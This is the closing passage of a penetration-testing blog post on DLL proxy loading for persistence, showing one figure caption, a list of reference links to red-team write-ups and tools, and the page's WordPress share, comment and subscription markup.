<figure class="aligncenter size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-process-thread.png"><img data-attachment-id="33430" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-process-thread/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-process-thread.png" data-orig-size="476,584" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-process-thread" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-process-thread.png?w=245" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-process-thread.png?w=476" loading="lazy" width="476" height="584" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-process-thread.png?w=476" alt="" class="wp-image-33430"></a><figcaption class="wp-element-caption">DLL Proxy Loading – Thread</figcaption></figure>
</div>


<h2 class="wp-block-heading">References</h2>



<ul class="wp-block-list">
<li><a href="https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence">https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence</a></li>



<li><a href="https://github.com/tothi/dll-hijack-by-proxying">https://github.com/tothi/dll-hijack-by-proxying</a></li>



<li><a href="https://github.com/Flangvik/SharpDllProxy">https://github.com/Flangvik/SharpDllProxy</a></li>



<li><a href="https://www.cobaltstrike.com/blog/create-a-proxy-dll-with-artifact-kit">https://www.cobaltstrike.com/blog/create-a-proxy-dll-with-artifact-kit</a></li>



<li><a href="https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/">https://redteaming.co.uk/2020/07/12/dll-proxy-loading-your-favorite-c-implant/</a></li>
</ul>
<div id="jp-post-flair" class="sharedaddy sd-rating-enabled sd-like-enabled sd-sharing-enabled"><div class="sd-block sd-rating"><h3 class="sd-title">Rate this:</h3><div class="cs-rating pd-rating" id="pd_rating_holder_5556500_post_33393"></div></div><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-33393" class="share-twitter sd-button share-icon no-text" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=twitter" target="_blank" aria-labelledby="sharing-twitter-33393">
				<span id="sharing-twitter-33393">Share on X (Opens in new window)</span>
				<span>X</span>
			</a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-33393" class="share-facebook sd-button share-icon no-text" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=facebook" target="_blank" aria-labelledby="sharing-facebook-33393">
				<span id="sharing-facebook-33393">Share on Facebook (Opens in new window)</span>
				<span>Facebook</span>
			</a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-33393" class="share-linkedin sd-button share-icon no-text" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=linkedin" target="_blank" aria-labelledby="sharing-linkedin-33393">
				<span id="sharing-linkedin-33393">Share on LinkedIn (Opens in new window)</span>
				<span>LinkedIn</span>
			</a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="sharing-reddit-33393" class="share-reddit sd-button share-icon no-text" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=reddit" target="_blank" aria-labelledby="sharing-reddit-33393">
				<span id="sharing-reddit-33393">Share on Reddit (Opens in new window)</span>
				<span>Reddit</span>
			</a></li><li class="share-mastodon"><a rel="nofollow noopener noreferrer" data-shared="sharing-mastodon-33393" class="share-mastodon sd-button share-icon no-text" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=mastodon" target="_blank" aria-labelledby="sharing-mastodon-33393">
				<span id="sharing-mastodon-33393">Share on Mastodon (Opens in new window)</span>
				<span>Mastodon</span>
			</a></li><li class="share-tumblr"><a rel="nofollow noopener noreferrer" data-shared="sharing-tumblr-33393" class="share-tumblr sd-button share-icon no-text" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=tumblr" target="_blank" aria-labelledby="sharing-tumblr-33393">
				<span id="sharing-tumblr-33393">Share on Tumblr (Opens in new window)</span>
				<span>Tumblr</span>
			</a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="sharing-whatsapp-33393" class="share-jetpack-whatsapp sd-button share-icon no-text" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=jetpack-whatsapp" target="_blank" aria-labelledby="sharing-whatsapp-33393">
				<span id="sharing-whatsapp-33393">Share on WhatsApp (Opens in new window)</span>
				<span>WhatsApp</span>
			</a></li><li class="share-telegram"><a rel="nofollow noopener noreferrer" data-shared="sharing-telegram-33393" class="share-telegram sd-button share-icon no-text" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=telegram" target="_blank" aria-labelledby="sharing-telegram-33393">
				<span id="sharing-telegram-33393">Share on Telegram (Opens in new window)</span>
				<span>Telegram</span>
			</a></li><li class="share-pinterest"><a rel="nofollow noopener noreferrer" data-shared="sharing-pinterest-33393" class="share-pinterest sd-button share-icon no-text" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=pinterest" target="_blank" aria-labelledby="sharing-pinterest-33393">
				<span id="sharing-pinterest-33393">Share on Pinterest (Opens in new window)</span>
				<span>Pinterest</span>
			</a></li><li class="share-pocket"><a rel="nofollow noopener noreferrer" data-shared="sharing-pocket-33393" class="share-pocket sd-button share-icon no-text" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=pocket" target="_blank" aria-labelledby="sharing-pocket-33393">
				<span id="sharing-pocket-33393">Share on Pocket (Opens in new window)</span>
				<span>Pocket</span>
			</a></li><li class="share-email"><a rel="nofollow noopener noreferrer" data-shared="sharing-email-33393" class="share-email sd-button share-icon no-text" href="mailto:?subject=%5BShared%20Post%5D%20Persistence%20-%20DLL%20Proxy%20Loading&amp;body=https%3A%2F%2Fpentestlab.blog%2F2024%2F04%2F03%2Fpersistence-dll-proxy-loading%2F&amp;share=email" target="_blank" aria-labelledby="sharing-email-33393" data-email-share-error-title="Do you have email set up?" data-email-share-error-text="If you're having problems sharing via email, you might not have email set up for your browser. You may need to create a new email yourself." data-email-share-nonce="68f2249230" data-email-share-track-url="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/?share=email">
				<span id="sharing-email-33393">Email a link to a friend (Opens in new window)</span>
				<span>Email</span>
			</a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" id="like-post-wrapper-32637504-33393-699512f91cc92" data-src="//widgets.wp.com/likes/index.html?ver=20260218#blog_id=32637504&amp;post_id=33393&amp;origin=pentestlab.wordpress.com&amp;obj_id=32637504-33393-699512f91cc92&amp;domain=pentestlab.blog" data-name="like-post-frame-32637504-33393-699512f91cc92" data-title="Like or Reblog"><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;"><span class="button"><span>Like</span></span> <span class="loading">Loading...</span></div><span class="sd-text-color"></span><a class="sd-link-color"></a></div>
<div id="jp-relatedposts" class="jp-relatedposts">
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div></div>					</div>

		

		


	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a comment <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://pentestlab.blog/wp-comments-post.php" method="post" id="commentform" class="comment-form">


<div class="comment-form__verbum transparent"></div><div class="verbum-form-meta">


			
			</div><p style="display: none;"></p><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>Δ<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label>
</p></form>	</div><!-- #respond -->
	
		
	
	</article>

</section>

	


</main>

<!-- #colophon -->

</div><!-- .wrapper -->



<!--  -->





	

		<div style="display:none">
	<div class="grofile-hash-map-4605db59f0637ffc3e084bd14d744ff7">
	</div>
	</div>
		<div id="actionbar" dir="ltr" style="display: none;" class="actnbr-premium-thefour actnbr-has-follow actnbr-has-actions">
		<ul>
								<li class="actnbr-btn actnbr-hidden">
						<a class="actnbr-action actnbr-actn-comment" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/#respond">
							<svg class="gridicon gridicons-comment" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M12 16l-5 5v-5H5c-1.1 0-2-.9-2-2V5c0-1.1.9-2 2-2h14c1.1 0 2 .9 2 2v9c0 1.1-.9 2-2 2h-7z"></path></g></svg>							<span>Comment						</span>
						</a>
					</li>
									<li class="actnbr-btn actnbr-hidden">
						<a class="actnbr-action actnbr-actn-reblog" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/">
							<svg class="gridicon gridicons-reblog" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M22.086 9.914L20 7.828V18c0 1.105-.895 2-2 2h-7v-2h7V7.828l-2.086 2.086L14.5 8.5 19 4l4.5 4.5-1.414 1.414zM6 16.172V6h7V4H6c-1.105 0-2 .895-2 2v10.172l-2.086-2.086L.5 15.5 5 20l4.5-4.5-1.414-1.414L6 16.172z"></path></g></svg><span>Reblog</span>
						</a>
					</li>
									<li class="actnbr-btn actnbr-hidden">
								<a class="actnbr-action actnbr-actn-follow " href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path clip-rule="evenodd" d="m4 4.5h12v6.5h1.5v-6.5-1.5h-1.5-12-1.5v1.5 10.5c0 1.1046.89543 2 2 2h7v-1.5h-7c-.27614 0-.5-.2239-.5-.5zm10.5 2h-9v1.5h9zm-5 3h-4v1.5h4zm3.5 1.5h-1v1h1zm-1-1.5h-1.5v1.5 1 1.5h1.5 1 1.5v-1.5-1-1.5h-1.5zm-2.5 2.5h-4v1.5h4zm6.5 1.25h1.5v2.25h2.25v1.5h-2.25v2.25h-1.5v-2.25h-2.25v-1.5h2.25z" fill-rule="evenodd"></path></svg>
			<span>Subscribe</span>
		</a>
		<a class="actnbr-action actnbr-actn-following  no-display" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 4.5H4V15C4 15.2761 4.22386 15.5 4.5 15.5H11.5V17H4.5C3.39543 17 2.5 16.1046 2.5 15V4.5V3H4H16H17.5V4.5V12.5H16V4.5ZM5.5 6.5H14.5V8H5.5V6.5ZM5.5 9.5H9.5V11H5.5V9.5ZM12 11H13V12H12V11ZM10.5 9.5H12H13H14.5V11V12V13.5H13H12H10.5V12V11V9.5ZM5.5 12H9.5V13.5H5.5V12Z" fill="#008A20"></path><path class="following-icon-tick" d="M13.5 16L15.5 18L19 14.5" stroke="#008A20" stroke-width="1.5"></path></svg>
			<span>Subscribed</span>
		</a>
							<div class="actnbr-popover tip tip-top-left actnbr-notice" id="follow-bubble">
							<div class="tip-arrow"></div>
							<div class="tip-inner actnbr-follow-bubble">
															<ul>
											<li class="actnbr-sitename">
			<a href="https://pentestlab.blog/">
				<img loading="lazy" alt="" src="https://pentestlab.blog/wp-content/uploads/2024/08/cropped-pentestlab.webp?w=50" class="avatar avatar-50" height="50" width="50">				Penetration Testing Lab			</a>
		</li>
										<div class="actnbr-message no-display"></div>
									<form method="post" action="https://subscribe.wordpress.com/" accept-charset="utf-8" style="display: none;">
																						<div class="actnbr-follow-count">Join 2,366 other subscribers</div>
																					<div>
										<input type="email" name="email" placeholder="Enter your email address" class="actnbr-email-field" aria-label="Enter your email address">
										</div>
										
										
										
										
																				<div class="actnbr-button-wrap">
											<button type="submit" value="Sign me up">
												Sign me up											</button>
										</div>
									</form>
									<li class="actnbr-login-nudge">
										<div>
											Already have a WordPress.com account? <a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fpentestlab.blog%252F2024%252F04%252F03%252Fpersistence-dll-proxy-loading%252F">Log in now.</a>										</div>
									</li>
								</ul>
															</div>
						</div>
					</li>
							<li class="actnbr-ellipsis actnbr-hidden">
				<svg class="gridicon gridicons-ellipsis" height="24" width="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M7 12c0 1.104-.896 2-2 2s-2-.896-2-2 .896-2 2-2 2 .896 2 2zm12-2c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2zm-7 0c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2z"></path></g></svg>				<div class="actnbr-popover tip tip-top-left actnbr-more">
					<div class="tip-arrow"></div>
					<div class="tip-inner">
						<ul>
								<li class="actnbr-sitename">
			<a href="https://pentestlab.blog/">
				<img loading="lazy" alt="" src="https://pentestlab.blog/wp-content/uploads/2024/08/cropped-pentestlab.webp?w=50" class="avatar avatar-50" height="50" width="50">				Penetration Testing Lab			</a>
		</li>
								<li class="actnbr-folded-follow">
										<a class="actnbr-action actnbr-actn-follow " href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path clip-rule="evenodd" d="m4 4.5h12v6.5h1.5v-6.5-1.5h-1.5-12-1.5v1.5 10.5c0 1.1046.89543 2 2 2h7v-1.5h-7c-.27614 0-.5-.2239-.5-.5zm10.5 2h-9v1.5h9zm-5 3h-4v1.5h4zm3.5 1.5h-1v1h1zm-1-1.5h-1.5v1.5 1 1.5h1.5 1 1.5v-1.5-1-1.5h-1.5zm-2.5 2.5h-4v1.5h4zm6.5 1.25h1.5v2.25h2.25v1.5h-2.25v2.25h-1.5v-2.25h-2.25v-1.5h2.25z" fill-rule="evenodd"></path></svg>
			<span>Subscribe</span>
		</a>
		<a class="actnbr-action actnbr-actn-following  no-display" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 4.5H4V15C4 15.2761 4.22386 15.5 4.5 15.5H11.5V17H4.5C3.39543 17 2.5 16.1046 2.5 15V4.5V3H4H16H17.5V4.5V12.5H16V4.5ZM5.5 6.5H14.5V8H5.5V6.5ZM5.5 9.5H9.5V11H5.5V9.5ZM12 11H13V12H12V11ZM10.5 9.5H12H13H14.5V11V12V13.5H13H12H10.5V12V11V9.5ZM5.5 12H9.5V13.5H5.5V12Z" fill="#008A20"></path><path class="following-icon-tick" d="M13.5 16L15.5 18L19 14.5" stroke="#008A20" stroke-width="1.5"></path></svg>
			<span>Subscribed</span>
		</a>
								</li>
														<li class="actnbr-signup"><a href="https://wordpress.com/start/">Sign up</a></li>
							<li class="actnbr-login"><a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fpentestlab.blog%252F2024%252F04%252F03%252Fpersistence-dll-proxy-loading%252F">Log in</a></li>
																<li class="actnbr-shortlink">
										<a href="https://wp.me/p2cWvm-8GB">
											<span class="actnbr-shortlink__text">Copy shortlink</span>
											<span class="actnbr-shortlink__icon"><svg class="gridicon gridicons-checkmark" height="16" width="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M9 19.414l-6.707-6.707 1.414-1.414L9 16.586 20.293 5.293l1.414 1.414"></path></g></svg></span>
										</a>
									</li>
																<li class="flb-report">
									<a href="https://wordpress.com/abuse/?report_url=https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/" target="_blank" rel="noopener noreferrer">
										Report this content									</a>
								</li>
															<li class="actnbr-reader">
									<a href="https://wordpress.com/reader/blogs/32637504/posts/33393">
										View post in Reader									</a>
								</li>
															<li class="actnbr-subs">
									<a href="https://subscribe.wordpress.com/">Manage subscriptions</a>
								</li>
																<li class="actnbr-fold"><a href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/">Collapse this bar</a></li>
														</ul>
					</div>
				</div>
			</li>
		</ul>
	</div>
	


			<div id="jp-carousel-loading-overlay">
			<div id="jp-carousel-loading-wrapper">
				<span id="jp-carousel-library-loading">&nbsp;</span>
			</div>
		</div>
		<div class="jp-carousel-overlay" style="display: none;">

		<div class="jp-carousel-container">
			<!-- The Carousel Swiper -->
			<div class="jp-carousel-wrap swiper jp-carousel-swiper-container jp-carousel-transitions" itemscope="" itemtype="https://schema.org/ImageGallery">
				<div class="jp-carousel swiper-wrapper"></div>
				<div class="jp-swiper-button-prev swiper-button-prev">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskPrev" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="9" height="12">
							<path d="M16.2072 16.59L11.6496 12L16.2072 7.41L14.8041 6L8.8335 12L14.8041 18L16.2072 16.59Z" fill="white"></path>
						</mask>
						<g mask="url(#maskPrev)">
							<rect x="0.579102" width="23.8823" height="24" fill="#FFFFFF"></rect>
						</g>
					</svg>
				</div>
				<div class="jp-swiper-button-next swiper-button-next">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskNext" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="8" height="12">
							<path d="M8.59814 16.59L13.1557 12L8.59814 7.41L10.0012 6L15.9718 12L10.0012 18L8.59814 16.59Z" fill="white"></path>
						</mask>
						<g mask="url(#maskNext)">
							<rect x="0.34375" width="23.8822" height="24" fill="#FFFFFF"></rect>
						</g>
					</svg>
				</div>
			</div>
			<!-- The main close buton -->
			<div class="jp-carousel-close-hint">
				<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
					<mask id="maskClose" mask-type="alpha" maskUnits="userSpaceOnUse" x="5" y="5" width="15" height="14">
						<path d="M19.3166 6.41L17.9135 5L12.3509 10.59L6.78834 5L5.38525 6.41L10.9478 12L5.38525 17.59L6.78834 19L12.3509 13.41L17.9135 19L19.3166 17.59L13.754 12L19.3166 6.41Z" fill="white"></path>
					</mask>
					<g mask="url(#maskClose)">
						<rect x="0.409668" width="23.8823" height="24" fill="#FFFFFF"></rect>
					</g>
				</svg>
			</div>
			<!-- Image info, comments and meta -->
			<div class="jp-carousel-info">
				<div class="jp-carousel-info-footer">
					<div class="jp-carousel-pagination-container">
						<div class="jp-swiper-pagination swiper-pagination"></div>
						<div class="jp-carousel-pagination"></div>
					</div>
					<div class="jp-carousel-photo-title-container">
						<h2 class="jp-carousel-photo-caption"></h2>
					</div>
					<div class="jp-carousel-photo-icons-container">
						<a href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/#" class="jp-carousel-icon-btn jp-carousel-icon-info" aria-label="Toggle photo metadata visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskInfo" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M12.7537 2C7.26076 2 2.80273 6.48 2.80273 12C2.80273 17.52 7.26076 22 12.7537 22C18.2466 22 22.7046 17.52 22.7046 12C22.7046 6.48 18.2466 2 12.7537 2ZM11.7586 7V9H13.7488V7H11.7586ZM11.7586 11V17H13.7488V11H11.7586ZM4.79292 12C4.79292 16.41 8.36531 20 12.7537 20C17.142 20 20.7144 16.41 20.7144 12C20.7144 7.59 17.142 4 12.7537 4C8.36531 4 4.79292 7.59 4.79292 12Z" fill="white"></path>
									</mask>
									<g mask="url(#maskInfo)">
										<rect x="0.8125" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>
							</span>
						</a>
												<a href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/#" class="jp-carousel-icon-btn jp-carousel-icon-comments" aria-label="Toggle photo comments visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskComments" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M4.3271 2H20.2486C21.3432 2 22.2388 2.9 22.2388 4V16C22.2388 17.1 21.3432 18 20.2486 18H6.31729L2.33691 22V4C2.33691 2.9 3.2325 2 4.3271 2ZM6.31729 16H20.2486V4H4.3271V18L6.31729 16Z" fill="white"></path>
									</mask>
									<g mask="url(#maskComments)">
										<rect x="0.34668" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>

								<span class="jp-carousel-has-comments-indicator" aria-label="This image has comments."></span>
							</span>
						</a>
											</div>
				</div>
				<div class="jp-carousel-info-extra">
					<div class="jp-carousel-info-content-wrapper">
						<div class="jp-carousel-photo-title-container">
							<h2 class="jp-carousel-photo-title"></h2>
						</div>
						<div class="jp-carousel-comments-wrapper">
															<div id="jp-carousel-comments-loading">
									<span>Loading Comments...</span>
								</div>
								<div class="jp-carousel-comments"></div>
								<div id="jp-carousel-comment-form-container">
									<span id="jp-carousel-comment-form-spinner">&nbsp;</span>
									<div id="jp-carousel-comment-post-results"></div>
																														<form id="jp-carousel-comment-form">
												<label for="jp-carousel-comment-form-comment-field" class="screen-reader-text">Write a Comment...</label>
												<textarea name="comment" class="jp-carousel-comment-form-field jp-carousel-comment-form-textarea" id="jp-carousel-comment-form-comment-field" placeholder="Write a Comment..."></textarea>
												<div id="jp-carousel-comment-form-submit-and-info-wrapper">
													<div id="jp-carousel-comment-form-commenting-as">
																													<fieldset>
																<label for="jp-carousel-comment-form-email-field">Email (Required)</label>
																<input type="text" name="email" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-email-field">
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-author-field">Name (Required)</label>
																<input type="text" name="author" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-author-field">
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-url-field">Website</label>
																<input type="text" name="url" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-url-field">
															</fieldset>
																											</div>
													<input type="submit" name="submit" class="jp-carousel-comment-form-button" id="jp-carousel-comment-form-button-submit" value="Post Comment">
												</div>
											</form>
																											</div>
													</div>
						<div class="jp-carousel-image-meta">
							<div class="jp-carousel-title-and-caption">
								<div class="jp-carousel-photo-info">
									<h3 class="jp-carousel-caption" itemprop="caption description"></h3>
								</div>

								<div class="jp-carousel-photo-description"></div>
							</div>
							<ul class="jp-carousel-image-exif" style="display: none;"></ul>
							<a class="jp-carousel-image-download" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/#" target="_blank" style="display: none;">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="3" y="3" width="19" height="18">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M5.84615 5V19H19.7775V12H21.7677V19C21.7677 20.1 20.8721 21 19.7775 21H5.84615C4.74159 21 3.85596 20.1 3.85596 19V5C3.85596 3.9 4.74159 3 5.84615 3H12.8118V5H5.84615ZM14.802 5V3H21.7677V10H19.7775V6.41L9.99569 16.24L8.59261 14.83L18.3744 5H14.802Z" fill="white"></path>
									</mask>
									<g mask="url(#mask0)">
										<rect x="0.870605" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>
								<span class="jp-carousel-download-text"></span>
							</a>
							<div class="jp-carousel-image-map" style="display: none;"></div>
						</div>
					</div>
				</div>
			</div>
		</div>

		</div>
		
	
						


	













<div id="fb-root"></div>








</body></html>